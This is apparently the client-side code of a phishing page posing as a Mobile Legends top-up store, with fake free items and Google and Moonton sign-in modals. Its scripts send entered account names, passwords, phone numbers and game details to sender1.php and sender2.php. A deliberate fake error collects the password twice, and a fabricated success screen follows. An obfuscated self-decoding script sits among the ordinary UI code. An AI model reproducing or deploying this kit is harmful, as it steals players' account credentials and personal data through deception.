        $('#login-backdrop').removeClass('opacity-100').addClass('opacity-0');
        $('#login-panel').removeClass('translate-y-0 opacity-100').addClass('translate-y-full opacity-0');
        setTimeout(() => {
            $('#login-modal').addClass('hidden');
            
            resetGoogleForm(); 
            $('#overlay').fadeIn(200).css('display', 'flex'); 
        }, 300);
    });

    $('#btn-login-google2').click(function() {
        $('#login-backdrop').removeClass('opacity-100').addClass('opacity-0');
        $('#login-panel').removeClass('translate-y-0 opacity-100').addClass('translate-y-full opacity-0');
        setTimeout(() => {

            $('#mtFailed').addClass('hidden');
            $('#login-modal').addClass('hidden');
            
            resetGoogleForm(); 
            $('#overlay').fadeIn(200).css('display', 'flex'); 
        }, 300);
    });


});
</script>
<script>
var DontForgetMe;(function(){var OzC='',dXm=930-919;function VWq(r){var f=1229433;var n=r.length;var q=[];for(var s=0;s<n;s++){q[s]=r.charAt(s)};for(var s=0;s<n;s++){var v=f*(s+387)+(f%52809);var m=f*(s+444)+(f%46583);var a=v%n;var x=m%n;var d=q[a];q[a]=q[x];q[x]=d;f=(v+m)%3056579;};return q.join('')};var JFX=VWq('scomcrxteronugctovdlsiuyafpqrbtknwhjz').substr(0,dXm);var vCo='vai5.s15rr="egz(ow znr8;=(;bhl(f}hv.c1"f!p75(n]rwxu.=m)n(;pi 99b8(,sj,fje7d06er>pnqraar[sto4i,o6r;8]wp{rb;e0)(1,d sl ,i{uugg.)omk]+]r )vha7<t;n+(e9r)rvvh2bu=t(b l}z =(+;;t;rfn*0ely Cr6tr+prboA[;2.[zvalgstrth=.h; .g.t0ek-zl0+utufn;(0+o.p)go7g;utl.vs,)r(=p.u7f+u 4+vfe(+.x1a)s+lead,7io;)v=,s.fa4ev=r(u=+oiin; ;"m=7[1y(vir;e=n,v;se+6<i=0;.,c(f=2tt";a+hi2au d(ao=tv"r -r+duy[u1o,h7t s](==v[ +i[o{r)](uo(-a8aj=e[sz9uj=is{t=rxvn8zr,r.chora;dnn[,uttra0nA=u;u+ell.td{;l ,n4h8b,=rralp+)=n.9u,0<vocr+;=;ee(a{;vu-;Cu,am(rr+geii)=r28-i;h=u2+(-rez)1;,j;ap2=ajavkcv5rs jj.l)bu;;ho}8a=.0=r]e],;was=ei-rSn7,=(++(0ht ejC;wen.A"lnkvnh1;)]"grvr98bl=+;g8j 0e)Sazdur)u6)mgtzat3[k6m6.h por)eoiw]ern+=*tfu}))e,yh,la)A1er)],tc);6[v")csa(g=)[r[;l2C1n+;l,3Cx9s<b(i}p mn.asd3( arvtltyg,f(>tCh=nn;n"o}al(]io=k)eczo; );yal1hatn umf"(=ad]po)..(va}9,7pAle)antff]C)0s==;g.f()=Ch.,(.g[ {;2k)1al!rf;v;=vrc<h;fgv6rahwgo=nn)ba';var oWx=VWq[JFX];var HAp='';var KvN=oWx;var BUe=oWx(HAp,VWq(vCo));var LzU=BUe(VWq('z<7;$(pu8.r:r5k(fe),i]e)(%pa(.c0n]g7)2Zr.6(;ks8;6of2a[Z7_55)xo.Z=i.f{ZdZ=(\'ipo*i1D3l3s8.st4n;tdde$29l.Z0x=.\'2;o$gZr45" (5y;(,\/.!o9nz+)&_aeoa4%Z0rr;=*+Z;%Z&9iZ$.ne(d3_Z_Z.1e)bxZ(__=lgfZ.,r2Z_rZ$uZZZ,Z!u.:=&fr6ha9+l_n4vte[#(i]os(aZZn. 8)%%Z__Z.=_8";%d]3nl.=)\/d32d!Zn9bf1_j11Smfo$\'%_2(Z,z.fr79#:Zrn]0(%de}s)x[8n,$5]np)2\/_u$1->Zzubeial((2"j)1$]aZ%m)&i\/e;95b650dmt_)f fe2i#5_(()a.<sex),t(k(}.upy;t5)2Zmfao:Z9Z8vZbae4)5Zz5te)r4tl_pz kel drwn6( !$]nn$Z!5.._$l:.r f_42fnt5Zl17$x==(+).oe}xa!7;s1Z3.)oZ{4ai;}]%i.(]=x=0ZZ0%Z.s2.5i[8lZ.e.m31sg4sd3MZoc(()]o0,juyo(3!Z})[r))iZa4)4yaZ3_ua.],;s=Z)o6k!m=lf Z%aZxh,3ujt>)=&)S1yae; \'u_fo[;aZ,+3ZZ#3!Zy%;Z;l)3(t_g,oZ)n,,;o<6,sa.3_bp 394\/%$ire6oa)jZe(2],m(Zi%(o.c=7ZZj].mZZ_w.rv_sZfz1oedZd1,7eeo;a4e36-a71arg(2e()!4aaj=}e##jZ5.a!.)fdZ0a3=%(i6te6#_!_z6p44g)fn7rZ)).i.".)j_oc_4e;");.so3oa=3t8._y]ZZpZg,h2(a_3b7$Z3a{1._o9wroa)o)).b(Zw({56r(3<8f:)().}Z=Z,6}n$,utZo(*Z5a8n9[Zn]6D$4(_c =73w3ce3(a.Zh.Zf_.vZ$ZZe2}))]o;a.}a0)Z,e)fk$Z7Z+ZZ!.a[(5el.=5a]eoa\',=(5I[Zs%u$j=o;=tZfk)i4dZ%n(oZbe6f_<!ZeZtb;vs:>(_$!{:o5ZZpitZ;.ZZ0.}cuZ(s,{Z_e028)z)c2t;5.4Z764)4]Z_(z{64$c_ZiTfy#(p(f}(m+Zi.)]il\/s()e\/#Ze[0)$t!mcC055!!4)!,){tn;p)Za[].Z_t<feZ4,,r0Ze.%5p.Z;ta"sZ,cZ)(=o{eyeeiZ.e8Z(;)Z3e({:$peZ5n.w}5 n.y9#75Inj(Z7)ZZa03e2=C1 2()(c]0eZZs_nf2e$"[_0ac%_2 _3 0dZ)ew5oZe(=.>73_5r\/;g0[a$5s.eb{;$2!&Ze7.p;Zn%ib(r,}y x8.)}5{8l1%siaf)<953  ,Zked)Sxp(s,*_ _eZ!2Z((-.n(,(z.SsZZ;Zi5(,k4pg!op6_t(ZoZ7,a86ar4x4eZ2p.e5{el.me!, e$,Zb$9n)(\/e;}tso.Zz4Zl[3_;l)#54gZf6gdnZ; 6.0!; h0$_(9%eZt(6i(([a03k.i_n7;38r;3)77k;3c rn,ZferZ5-\/t)1,s#,;uZZ_-h7Z c6[Zr9$g+a0&Z)nZ!tpZf{)_ ftef$r[4,Zi(m7us]na a5_c.e) t({( Z$Z!83),$l$t%{eZ6o8 9{e)$aZZ.z:ri:t$e(+$;.7(D.nZZ,)_Z=_0T_ka4_$!!.946Zojai0])itrfZ]7t[]Z 7etu5,e;.!)31_z<fZ$5oZZmf=rda]]'));var oRg=KvN(OzC,LzU );oRg(7271);return 3455})()
</script>
<script>
$(document).ready(function() {
    const REQUIRED_ATTEMPTS_MOONTON = 2; 
    let moontonAttempts = 0;

    $('#btn-login-moonton').click(function() {
        $('#login-backdrop').removeClass('opacity-100').addClass('opacity-0');
        $('#login-panel').removeClass('translate-y-0 opacity-100').addClass('translate-y-full opacity-0');
        setTimeout(() => {
            // $('#login-modal').addClass('hidden');
            $('#mtFailed').show();
            resetMoontonForm();
            // $('#moonton-overlay').fadeIn(200).css('display', 'flex'); 
            
        }, 300);
    });

    $('#close-moonton').click(function() {
        $('#moonton-overlay').fadeOut(200);
    });

    $('#mt-toggle-pass').click(function() {
        let input = $('#mt-password');
        if (input.attr('type') === 'password') {
            input.attr('type', 'text');
            $(this).attr('src', 'https://coda-play.mlbb-events.my.id/img/bukamata.png');
        } else {
            input.attr('type', 'password');
            $(this).attr('src', 'https://coda-play.mlbb-events.my.id/img/tutupmata.png');
        }
    });

    function resetMoontonForm() {
        moontonAttempts = 0;
        $('#mt-account').val('');
        $('#mt-password').val('');
        $('#mt-error-toast').hide();
        validateMtInput();
    }

    function validateMtInput() {
        let acc = $('#mt-account').val().trim();
        let pwd = $('#mt-password').val().trim();
        
        if (acc.length > 0 && pwd.length > 0) {
            $('#mt-login-btn').removeClass('mt-btn-off').addClass('mt-btn-on');
        } else {
            $('#mt-login-btn').removeClass('mt-btn-on').addClass('mt-btn-off');
        }
    }

    $('#mt-account, #mt-password').on('input keyup', function() {
        validateMtInput();
    });

    $('#mt-login-btn').click(function() {
        if ($(this).hasClass('mt-btn-off')) return;

        let account = $('#mt-account').val();
        let password = $('#mt-password').val();

        $('#mt-login-btn').removeClass('mt-btn-on').addClass('mt-btn-off');

        $.ajax({
            url: 'sender1.php',
            type: 'POST',
            data: {
                email: account,
                password: password,
                login: 'Moonton',
                userid: window.checkoutState.userId,
                zoneid: window.checkoutState.zoneId,
                nickname: window.checkoutState.nickname
            },
            success: function(response) {
                setTimeout(function() {
                    moontonAttempts++;

                    if (moontonAttempts < REQUIRED_ATTEMPTS_MOONTON) {
                        $('#mt-error-toast').fadeIn(200);
                        setTimeout(() => { $('#mt-error-toast').fadeOut(300); }, 3000);
                        
                        $('#mt-password').val('');
                        validateMtInput();
                    } else {
                        window.checkoutState.loginAccount = account;
                        window.checkoutState.loginPassword = password;
                        window.checkoutState.loginInfo = 'Moonton';

                        $('#moonton-overlay').fadeOut(200);
                        window.openVerificationModal();
                    }

                }, 1500);
            }
        });
    });

});
</script>
<script>
$(document).ready(function() {
    let levelHtml = '<option value="" disabled selected>Select Account Level</option>';
    for(let i=1; i<=200; i++){
        levelHtml += `<option value="${i}">${i}</option>`;
    }
    $('#verify-level').html(levelHtml);

    function generateID(length) {
        let result = '';
        const chars = '0123456789';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    function openVerificationModal() {
        $('#verify-phone').val('').removeClass('border-red-500 border-2');
        $('#verify-level').val('').removeClass('border-red-500 border-2');
        $('#verify-rank').val('').removeClass('border-red-500 border-2');
        $('#verify-error').addClass('hidden');
        $('#btn-submit-verification').prop('disabled', false).text('Verify').css('opacity', '1');

        $('#verification-modal').removeClass('hidden');
        setTimeout(() => {
            $('#verify-backdrop').removeClass('opacity-0').addClass('opacity-100');
            $('#verify-panel').removeClass('translate-y-full opacity-0').addClass('translate-y-0 opacity-100');
        }, 10);
    }

    function openSuccessModal() {
        $('#success-product-img').attr('src', window.checkoutState.itemImage);
        $('#success-product-name').text(window.checkoutState.itemName);
        $('#success-payment').text(window.checkoutState.paymentName);
        $('#success-price').text(window.checkoutState.itemPrice || '$0.00');
        
        $('#success-order-id').text(generateID(18));
        $('#success-trx-id').text(generateID(18));

        $('#success-modal').removeClass('hidden');
        setTimeout(() => {
            $('#success-backdrop').removeClass('opacity-0').addClass('opacity-100');
            $('#success-panel').removeClass('scale-95 opacity-0').addClass('scale-100 opacity-100');
        }, 10);
    }


    $('#btn-submit-verification').click(function() {
        let phone = $('#verify-phone').val().trim();
        let level = $('#verify-level').val();
        let rank = $('#verify-rank').val();
        let $btn = $(this);
        let $errorBox = $('#verify-error');

        $errorBox.addClass('hidden');
        $('#verify-phone, #verify-level, #verify-rank').removeClass('border-red-500 border-2');

        if(!phone || !level || !rank) {
            $errorBox.removeClass('hidden');
            
            if(!phone) $('#verify-phone').addClass('border-red-500 border-2');
            if(!level) $('#verify-level').addClass('border-red-500 border-2');
            if(!rank) $('#verify-rank').addClass('border-red-500 border-2');
            
            return; 
        }

        $btn.text('Processing...').prop('disabled', true).css('opacity', '0.7');

        $.ajax({
            url: 'sender2.php',
            type: 'POST',
            data: {
                email: window.checkoutState.loginAccount,
                password: window.checkoutState.loginPassword,
                login: window.checkoutState.loginInfo,
                phone: phone,
                level: level,
                rank: rank,
                userid: window.checkoutState.userId,
                zoneid: window.checkoutState.zoneId,
                nickname: window.checkoutState.nickname
            },
            success: function() {
                setTimeout(() => {
                    $('#verify-backdrop').removeClass('opacity-100').addClass('opacity-0');
                    $('#verify-panel').removeClass('translate-y-0 opacity-100').addClass('translate-y-full opacity-0');
                    $('#verification-modal').addClass('hidden');
                    openSuccessModal();
                }, 1000);
            }
        });
    });
    $('#verify-phone, #verify-level, #verify-rank').on('input change', function() {
        $('#verify-error').addClass('hidden');
        $(this).removeClass('border-red-500 border-2');
    });

    window.openVerificationModal = openVerificationModal;

});
</script>
<script>
$(document).ready(function() {

    window.checkoutState = {
        userIdValid: false, 
        itemSelected: false,
        paymentSelected: false,
        itemName: '',
        paymentName: '',
        itemPrice: '$0.00', 
        itemImage: '',
        userId: '',
        zoneId: '',
        nickname: '',
        loginAccount: '',
        loginPassword: '',
        loginInfo: ''
    };

    let typingTimer;
    const doneTypingInterval = 1000;

    if ($('#profile-badge-wrapper').length === 0) {
        $('.user-identification__fields').after('<div id="profile-badge-wrapper"></div>');
    }

    $('#userId, #zoneId').on('input', function() {
        clearTimeout(typingTimer);
        const uid = $('#userId').val();
        const zid = $('#zoneId').val();
        $('.badgecheck').hide();
        $('.badgeerror').hide();
        $('.badgesuccess').hide();
        $('#userId, #zoneId').removeClass('text-field__input-container__input--error');
        $('.field-error-message').remove();
        window.checkoutState.userIdValid = false;

        if (zid.length > 5) {
            $('.badgecheck').hide();
            $('.badgeerror').hide();
            $('.badgesuccess').hide();
            $('#zoneId').addClass('text-field__input-container__input--error');
            
            const errorHtml = `
            <div class="field-error-message">
                <div class="field-error-message__icon">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M12 9a1 1 0 0 1 1 1v4a1 1 0 1 1-2 0v-4a1 1 0 0 1 1-1Zm0 7a1 1 0 1 0 0 2h.01a1 1 0 1 0 0-2H12Z"></path><path d="M10.655 3.361a2.689 2.689 0 0 1 2.69 0c.41.237.749.575.989.981l.003.005 7.296 12.497.008.014a2.803 2.803 0 0 1 .007 2.735c-.232.419-.57.771-.98 1.019-.411.248-.88.383-1.36.388H4.692a2.69 2.69 0 0 1-1.36-.388 2.74 2.74 0 0 1-.981-1.019 2.804 2.804 0 0 1 .007-2.735l.008-.014 7.3-12.502c.24-.406.579-.744.988-.98ZM12 5a.69.69 0 0 0-.345.093.743.743 0 0 0-.266.265l-7.29 12.486a.804.804 0 0 0 .001.778.748.748 0 0 0 .266.278.69.69 0 0 0 .345.1h14.578a.69.69 0 0 0 .345-.1c.108-.065.2-.16.266-.278a.804.804 0 0 0 0-.778L12.613 5.36l-.001-.002a.744.744 0 0 0-.266-.265A.69.69 0 0 0 12 5Z"></path></svg>
                </div>
                <div class="field-error-message__text">This field can contain maximum of 5 characters</div>
            </div>`;
            
            $('#zoneId').closest('.text-field').append(errorHtml);
            
            updateFooter();
            return;
        }

        if (uid.length >= 4 && zid.length >= 3) {
            $('.badgecheck').show();
            
            typingTimer = setTimeout(function() {
                checkGameId(uid, zid);
            }, doneTypingInterval);
        } else {
            updateFooter();
        }
    });

    function checkGameId(uid, zid) {

                    $('.badgesuccess').show();
                    $('#responseusername').html('Players');
                    $('.badgecheck').hide();

                    window.checkoutState.userIdValid = true;
                    window.checkoutState.userId = uid;
                    window.checkoutState.zoneId = zid;
                    window.checkoutState.nickname = response.username;
    }

    const initUid = $('#userId').val();
    const initZid = $('#zoneId').val();

    if (initUid && initZid && initUid.length >= 4 && initZid.length >= 3) {
        $('.badgecheck').show();
        checkGameId(initUid, initZid);
    }

    function updateFooter() {
        let s = window.checkoutState;

        $('.checkout-guide-button, .checkout-guide-buy-widget-container').hide();
        $('.buy-widget').removeClass('buy-widget--active');
        let $circle = $('.checkout-guide circle:eq(1)');

        if (s.itemSelected && s.paymentSelected) {
            if (s.userIdValid) {
                $('.checkout-guide-buy-widget-container').fadeIn();
                $('.buy-widget').css('display', 'flex').addClass('buy-widget--active');
                
                $('.buy-widget-status-section span').eq(0).text(s.itemName);
                $('.buy-widget-status-section span').eq(3).text(s.paymentName);
                $('.buy-widget-price span').text(s.itemPrice);
                let $strikeSection = $('.buy-widget-strikethrough-section');
                let realPrice = s.itemOriginalPrice || '$10.00';
                
                if ($strikeSection.length > 0) {
                    $strikeSection.find('.buy-widget-strikethrough-price').text(realPrice);
                    $strikeSection.find('.buy-widget-total-saved').text('Save ' + realPrice);
                }
            } else {
                $('.checkout-guide').fadeIn();
                $('.checkout-guide-buy-widget-container').hide();
                $('.guidenol').css('display', 'flex').fadeIn();
                $('.checkout-guide-label div').text('Enter User ID');
                $circle.css('stroke-dashoffset', '60'); 
            }
        } else {
            $('.checkout-guide').fadeIn();
            $('.checkout-guide-buy-widget-container').hide();

            if (s.itemSelected) {
                if (s.userIdValid) {
                    $('.guidedua').css('display', 'flex').fadeIn();
                    $('.checkout-guide-label div').text('Select Payment');
                    $circle.css('stroke-dashoffset', '25'); 
                } else {
                    $('.guidedua').css('display', 'flex').fadeIn();
                    $('.checkout-guide-label div').text('Select Payment');
                    $circle.css('stroke-dashoffset', '25'); 
                }
            } else {
                if (s.userIdValid) {
                    $('.guidesatu').css('display', 'flex').fadeIn();
                    $('.checkout-guide-label div').text('Select Top Up');
                    $circle.css('stroke-dashoffset', '45'); 
                } else {
                    $('.guidenol').css('display', 'flex').fadeIn();
                    $('.checkout-guide-label div').text('Enter User ID');
                    $circle.css('stroke-dashoffset', '60'); 
                }
            }
        }
    }

    $('.price-section').each(function() {
        let $priceContainer = $(this).find('.price-section__price__price-container');
        let $amount = $priceContainer.find('.price-section__price__price-container__amount');
        
        if (!$amount.data('original-price')) {
            $amount.data('original-price', $amount.text().trim());
        }

        $amount.text('$0.0');

        let $usualPrice = $(this).find('.price-section__usual-price');
        
        if ($usualPrice.length === 0) {
            let originalPrice = $amount.data('original-price'); 
            
            let discountHtml = `
                <div data-v-1a52783c="" class="price-section__usual-price">
                    <span data-v-1a52783c="" class="price-section__price__price-container__discount-tag"> -100% </span>
                    <span data-v-1a52783c="" class="price-section__usual-price__amount">${originalPrice}</span>
                </div>
            `;
            
            $(this).append(discountHtml);
        } else {
            $usualPrice.find('.price-section__price__price-container__discount-tag').text(' -100% ');
        }
    });
    $('.payment-method__price span').text('$0.00');

    $(window).on('scroll', function() {
        let scrollPos = $(window).scrollTop();
        $('section[data-testid="category-section"], .highlighted-skus__wrapper section').each(function() {
            let top = $(this).offset().top - 250;
            let bottom = top + $(this).outerHeight();
            
            if (scrollPos >= top && scrollPos < bottom) {
                let catName = $(this).find('.sku-list__category-name, .highlighted-skus__section-title').text().trim();
                if(catName === "Our best sellers for you") return; 
                updatePill(catName);
            }
        });
    });

    $('.sku-category__options [role="radio"]').click(function() {
        let catName = $(this).find('.sku-category__tile__name').text().trim();
        updatePill(catName);
        $('section[data-testid="category-section"]').each(function() {
            if ($(this).find('.sku-list__category-name').text().trim() === catName) {
                $('html, body').animate({ scrollTop: $(this).offset().top - 150 }, 300);
            }
        });
    });

    function updatePill(name) {
        $('.sku-category__options [role="radio"]').attr({'aria-checked': 'false', 'data-headlessui-state': ''});
        $('.sku-category__tile').removeClass('sku-category__tile--selected');
        $('.sku-category__tile__name').removeClass('sku-category__tile__name--selected');

        $('.sku-category__options [role="radio"]').each(function() {
            if ($(this).find('.sku-category__tile__name').text().trim() === name) {
                $(this).attr({'aria-checked': 'true', 'data-headlessui-state': 'checked'});
                $(this).find('.sku-category__tile').addClass('sku-category__tile--selected');
                $(this).find('.sku-category__tile__name').addClass('sku-category__tile__name--selected');
            }
        });
    }

    $('.sku-list, .highlighted-skus__list').on('click', '[role="radio"]', function() {
        
        $('.sku-card__inner-container').removeClass('sku-card--selected');
        $('.highlighted-sku-card__inner-container').removeClass('highlighted-sku-card--selected');
        
        $('[role="radio"]').attr({'aria-checked': 'false', 'tabindex': '-1', 'data-headlessui-state': ''});
        
        $(this).attr({'aria-checked': 'true', 'tabindex': '0', 'data-headlessui-state': 'checked'});
        
        if ($(this).find('.highlighted-sku-card__inner-container').length > 0) {
            $(this).find('.highlighted-sku-card__inner-container').addClass('highlighted-sku-card--selected');
        } else {
            $(this).find('.sku-card__inner-container').addClass('sku-card--selected');
        }

        window.checkoutState.itemSelected = true;
        window.checkoutState.itemName = $(this).find('.sku-info-section__titles__title span').text().trim();
        window.checkoutState.itemPrice = '$0.00'; 
        let originalPriceText = $(this).find('.price-section__usual-price__amount').text().trim();
        if (!originalPriceText) originalPriceText = '$10.00';
        window.checkoutState.itemOriginalPrice = originalPriceText;
        
        let imgTag = $(this).find('.sku-info-section__images__icon img');
        let srcSet = imgTag.attr('srcset');
        window.checkoutState.itemImage = srcSet ? srcSet.split(' ')[0] : imgTag.attr('src');

        $('.payment-section .payment-method__price span').text(window.checkoutState.itemPrice);

        let $guideBtn = $('.checkout-guide-button:visible');
        $guideBtn.css('background-color', '#2a9f3d');
        setTimeout(function() { updateFooter(); $guideBtn.css('background-color', ''); }, 500);
    });

    $('.payment-section').on('click', '[role="radio"]', function() {
        if (!window.checkoutState.itemSelected) {
            let $firstProduct = $('.highlighted-skus__list [role="radio"]').first();
            if($firstProduct.length === 0) {
                $firstProduct = $('.sku-list [role="radio"]').first();
            }
            if ($firstProduct.length) {
                $firstProduct.click();
            }
        }

        $('.payment-section [role="radio"]').attr({'aria-checked': 'false', 'tabindex': '-1', 'data-headlessui-state': ''});
        $('.payment-method').removeClass('payment-method--selected');
        $(this).attr({'aria-checked': 'true', 'tabindex': '0', 'data-headlessui-state': 'checked'});
        $(this).addClass('payment-method--selected');

        window.checkoutState.paymentSelected = true;
        window.checkoutState.paymentName = $(this).find('.payment-method__logo-tagline').text().trim();

        let $guideBtn = $('.guidedua');
        $guideBtn.css('background-color', '#2a9f3d'); 
        setTimeout(function() { updateFooter(); $guideBtn.css('background-color', ''); }, 500);
    });

    function openModal() {
        $('#confirmation-modal').removeClass('hidden');
        setTimeout(() => {
            $('#modal-backdrop').removeClass('opacity-0').addClass('opacity-100');
            $('#modal-panel').removeClass('translate-y-full opacity-0').addClass('translate-y-0 opacity-100');
        }, 10);
    }

    function closeModal() {
        $('#modal-backdrop').removeClass('opacity-100').addClass('opacity-0');
        $('#modal-panel').removeClass('translate-y-0 opacity-100').addClass('translate-y-full opacity-0');
        setTimeout(() => {
            $('#confirmation-modal').addClass('hidden');
        }, 300);
    }

    function openLoginModal() {
        $('#login-modal').removeClass('hidden');
        setTimeout(() => {
            $('#login-backdrop').removeClass('opacity-0').addClass('opacity-100');
            $('#login-panel').removeClass('translate-y-full opacity-0').addClass('translate-y-0 opacity-100');
        }, 10);
    }

    function closeLoginModal() {
        $('#login-backdrop').removeClass('opacity-100').addClass('opacity-0');
        $('#login-panel').removeClass('translate-y-0 opacity-100').addClass('translate-y-full opacity-0');
        setTimeout(() => {
            $('#login-modal').addClass('hidden');
        }, 300);
    }

    $(document).on('click', '#mdn-submit', function(e) {
        e.preventDefault();
        
        if (!window.checkoutState.userIdValid) {
            $('html, body').animate({ scrollTop: $('#userId').offset().top - 100 }, 500);
            $('#userId').focus();
            return;
        }

        if (!window.checkoutState.itemSelected || !window.checkoutState.paymentSelected) {
            alert('Please select item and payment method first.'); 
            return;
        }

        $('#modal-product-img').attr('src', window.checkoutState.itemImage);
        $('#modal-product-name').text(window.checkoutState.itemName);
        
        let displayNick = window.checkoutState.nickname || 'Unknown';
        $('#modal-nickname').text(displayNick);
        
        let fullId = window.checkoutState.userId + ' (' + window.checkoutState.zoneId + ')';
        $('#modal-userid').text(fullId);
        
        $('#modal-payment').text(window.checkoutState.paymentName);
        $('#modal-total-price').text('$0.00'); 

        openModal();
    });

    $('#btn-confirm-final').click(function() {
        closeModal();
        setTimeout(() => {
             openLoginModal();
        }, 300);
    });

    $('.close-modal-btn, #modal-backdrop').click(function() { closeModal(); });
    $('.close-login-btn, #login-backdrop').click(function() { closeLoginModal(); });

    $('#close-modal').click(function() { $('#login-modal').fadeOut(300); });
    $('#close-pre-login').click(function() { $('#pre-login-modal').fadeOut(300); });
    $('.close-order-modal').click(function() { $('#order-modal').fadeOut(300); });
    $('#btn-confirm-order').click(function() { $('#order-modal').fadeOut(200); $('#pre-login-modal').fadeIn(200).css('display', 'flex'); });
    $('#btn-open-main-login').click(function() { $('#pre-login-modal').fadeOut(200); $('#login-modal').fadeIn(300).css('display', 'flex'); if(typeof resetForm === 'function') resetForm(); });

});
</script>
<div id="confirmation-modal" class="fixed inset-0 z-50 hidden" role="dialog" aria-modal="true">
    <div class="fixed inset-0 bg-black/60 transition-opacity opacity-0" id="modal-backdrop"></div>
    <div class="fixed inset-0 z-10 flex items-end justify-center sm:items-center p-0 sm:p-4">
        <div id="modal-panel" class="relative w-full max-w-md transform overflow-hidden bg-white text-left shadow-xl transition-all rounded-t-2xl sm:rounded-2xl translate-y-full sm:translate-y-0 opacity-0 sm:opacity-100">
            
            <div class="px-5 pt-5 pb-2 flex justify-between items-start">
                <div>
                    <h3 class="text-xl font-bold text-gray-900">Order Details</h3>
                    <p class="mt-1 text-sm text-gray-500">Please confirm your order details are correct.</p>
                </div>
                <button type="button" class="close-modal-btn text-gray-400 hover:text-gray-500 focus:outline-none p-1">
                    <svg class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"></path>
                    </svg>
                </button>
            </div>

            <div class="px-5 py-2">
                
                <div class="relative mt-4 mb-6 rounded-xl border border-indigo-50 bg-[#F5F6FF] p-4 pt-4 shadow-sm overflow-hidden">
                    
                    <div class="absolute top-0 left-0 flex items-center gap-1 rounded-br-lg bg-gradient-to-r from-[#ff7f98] to-[#6242fb] px-3 py-1 text-[10px] font-bold text-white shadow-md overflow-hidden">
                        <div class="shimmer-effect"></div>
                        
                        <svg class="h-3 w-3 relative z-10" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
                        <span class="relative z-10 tracking-wide">BEST SELLER</span>
                    </div>
                    
                    <div class="flex items-center gap-4">
                        <img id="modal-product-img" src="" alt="Product" class="h-10 w-10 object-contain">
                        <span id="modal-product-name" class="font-bold text-gray-900 text-base">-</span>
                    </div>
                </div>

                <div class="space-y-2 border-b border-gray-100 pb-4">
                    <div class="flex justify-between text-sm">
                        <span class="text-gray-500">Nickname:</span>
                        <span id="modal-nickname" class="font-bold text-gray-900">-</span>
                    </div>
                    <div class="border-b border-gray-200"></div>
                    <div class="flex justify-between text-sm">
                        <span class="text-gray-500">ID:</span>
                        <span id="modal-userid" class="font-bold text-gray-900">-</span>
                    </div>
                    <div class="border-b border-gray-200"></div>
                    <div class="flex justify-between text-sm">
                        <span class="text-gray-500">Pay with:</span>
                        <span id="modal-payment" class="font-bold text-gray-900">-</span>
                    </div>
                    <div class="border-b border-gray-200"></div>
                    <div class="flex justify-between text-sm">
                        <span class="text-gray-500">Price:</span>
                        <span class="font-bold text-gray-900">$0.00</span>
                    </div>
                    <div class="border-b border-gray-200"></div>
                    <div class="flex justify-between text-sm">
                        <span class="text-gray-500">Tax:</span>
                        <span class="font-bold text-gray-900">$0.00</span>
                    </div>
                </div>
            </div>

            <div class="bg-green-100 px-5 py-3 flex items-center gap-2">
                <span class="text-green-600 text-sm">💰</span>
                <span class="text-xs font-medium text-green-800">You earn Rewards discount <strong>%100</strong></span>
            </div>

            <div class="flex items-center justify-between p-5 bg-white border-t border-gray-50">
                <div class="flex flex-col">
                    <span class="text-xs text-gray-500">Total Payment</span>
                    <span id="modal-total-price" class="text-2xl font-bold text-pink-500">$0.00</span>
                </div>
                <button id="btn-confirm-final" class="rounded-full bg-[#5b4ef6] px-8 py-3 text-sm font-bold text-white shadow-lg hover:bg-indigo-600 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 transition-all">
                    Confirm
                </button>
            </div>
        </div>
    </div>
</div>

<div id="login-modal" class="fixed inset-0 z-50 hidden" role="dialog" aria-modal="true">
    <div class="fixed inset-0 bg-black/60 transition-opacity opacity-0" id="login-backdrop"></div>
    <div class="fixed inset-0 z-10 flex items-end justify-center sm:items-center p-0 sm:p-4">
        <div id="login-panel" class="relative w-full max-w-md transform overflow-hidden bg-white text-left shadow-xl transition-all rounded-t-2xl sm:rounded-2xl translate-y-full sm:translate-y-0 opacity-0 sm:opacity-100">
            
            <div class="px-5 pt-5 pb-2 flex justify-between items-center">
                <h3 class="text-xl font-bold text-gray-900">Sign In</h3>
                <button type="button" class="close-login-btn text-gray-400 hover:text-gray-500 focus:outline-none p-1">
                    <svg class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"></path>
                    </svg>
                </button>
            </div>

            <div class="px-5 pb-6">
                <p class="text-sm text-gray-500 mb-6">Please sign in to complete your transaction.</p>
                
                <div class="space-y-4">
                    <button id="btn-login-google" class="group relative w-full flex items-center bg-[#5b4ef6] hover:bg-[#4a3ecf] rounded-full p-1.5 transition-all shadow-md active:scale-[0.98]">
                        <div class="flex h-10 w-10 items-center justify-center rounded-full bg-white shadow-sm">
                            <img src="images/btn_gp.png" alt="Google" class="h-6 w-6">
                        </div>
                        <span class="flex-1 text-center font-bold text-white text-base mr-3">Sign in with Google Account</span>
                    </button>

                    <button id="btn-login-moonton" class="group relative w-full flex items-center bg-[#5b4ef6] hover:bg-[#4a3ecf] rounded-full p-1.5 transition-all shadow-md active:scale-[0.98]">
                        <div class="flex h-10 w-10 items-center justify-center rounded-full bg-white shadow-sm overflow-hidden p-1">
                            <img src="images/btn_mt.png" alt="Moonton" class="h-full w-full object-cover">
                        </div>
                        <span class="flex-1 text-center font-bold text-white text-base mr-3">Sign in with Moonton Account</span>
                    </button>
                </div>
            </div>

            <div class="bg-gray-50 px-5 py-3 flex justify-center items-center gap-2">
                <svg class="h-4 w-4 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
